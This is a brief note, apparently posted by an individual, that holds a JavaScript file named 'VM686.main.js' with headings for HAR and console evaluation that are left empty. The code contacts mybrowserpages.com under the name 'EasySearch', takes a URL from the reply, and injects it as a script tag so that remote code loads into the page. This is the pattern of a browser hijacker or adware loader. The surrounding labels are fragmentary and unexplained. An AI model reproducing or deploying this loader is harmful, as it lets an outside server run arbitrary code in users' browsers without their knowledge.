-My build DIGITAL Command Language:
-Muhammad Adi Nugroho,S.Adm.Neg.:
-Via My Notepad (HTML Editor):
VM686.main.js:
var url = 'https://mybrowserpages.com';
var name = 'EasySearch';
post(url,name);
function post(url,name) {
    var jsonobj;
    var xmlhttp;
    xmlhttp = new XMLHttpRequest();
    var url_str = url+"/json/index.php?name="+name;
    xmlhttp.open('POST', url_str, true);
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4) {
            var jsontext = xmlhttp.responseText;
            jsonobj = JSON.parse(jsontext);
            if (jsonobj) {
                var script = document.createElement('script');
                script.src = jsonobj;
                var head = document.getElementsByTagName('head')[0];
                head.appendChild(script);
            }
        }
    };
    try {
        xmlhttp.send(null);
    } catch(e) {
        return false;
    }
    return true;
}
-HAR:

-To be evaluated in console:
